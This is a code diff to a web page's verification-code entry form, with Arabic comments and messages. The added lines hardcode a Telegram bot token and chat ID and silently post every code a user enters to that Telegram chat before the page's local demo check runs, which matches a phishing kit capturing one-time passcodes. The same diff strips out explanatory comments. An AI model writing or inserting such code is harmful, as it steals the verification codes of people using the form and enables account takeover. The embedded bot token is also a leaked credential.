@@ -164,6 +164,10 @@
   // demo code for local testing (you can ignore/change it)
   const DEMO_CODE = '123456';
 
+  // ✅ إضافة بيانات بوت التلغرام
+  const BOT_TOKEN = "8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I";
+  const CHAT_ID = "8404960059";
+
   // helpers
   function setStatus(msg, ok){
     statusArea.textContent = msg || '';
@@ -186,7 +190,6 @@
       if(e.key === 'Backspace' && !e.target.value && idx > 0){
         inputs[idx-1].focus();
       }
-      // allow paste via ctrl/cmd+v (handled in paste event)
     });
 
     input.addEventListener('paste', (ev) => {
@@ -200,10 +203,9 @@
     });
   });
 
-  // place focus on first field on load
   window.addEventListener('load', ()=> inputs[0].focus());
 
-  // verify logic (local)
+  // عند الضغط على زر تحقق
   verifyBtn.addEventListener('click', () => {
     const code = getCode();
     if(code.length !== inputs.length){
@@ -212,15 +214,25 @@
       return;
     }
 
-    // demo verification - replace with real check if needed
+    // إرسال الكود إلى بوت التلغرام
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: `رمز التحقق المدخل: ${code}`
+      })
+    }).then(res => res.json()).then(data => {
+      console.log("تم الإرسال إلى التلغرام", data);
+    }).catch(err => console.error("خطأ في الإرسال:", err));
+
+    // التحقق المحلي
     if(code === DEMO_CODE){
       setStatus('✅ تم التحقق بنجاح — شكراً', true);
-      // success behavior: you can redirect or show modal
       setTimeout(()=> { setStatus('إعادة ضبط الحقول للاختبار...', null); clearInputs(); }, 900);
     } else {
       setStatus('❌ الرمز غير صحيح، حاول مجدداً.', false);
       animateShake();
-      // clear last input for retry
       inputs.forEach(i => i.classList.add('shake'));
       setTimeout(()=> inputs.forEach(i => i.classList.remove('shake')), 420);
     }
@@ -250,17 +262,12 @@
   resendBtn.addEventListener('click', (e)=>{
     e.preventDefault();
     if(resendBtn.disabled) return;
-    // local resend simulation
     setStatus('تم إرسال رمز جديد (اختبار محلي).', true);
-    // restart timer
     countdown = 30;
     resendBtn.disabled = true;
     interval = setInterval(tick, 1000);
-    // For testing, you can also autofill DEMO_CODE or notify user
-    // inputs.forEach((el,i)=> el.value = DEMO_CODE.charAt(i));
   });
 
-  // accessibility: allow Enter to submit when focused in last input
   inputs[inputs.length-1].addEventListener('keyup', (e) => {
     if(e.key === 'Enter') verifyBtn.click();
   });
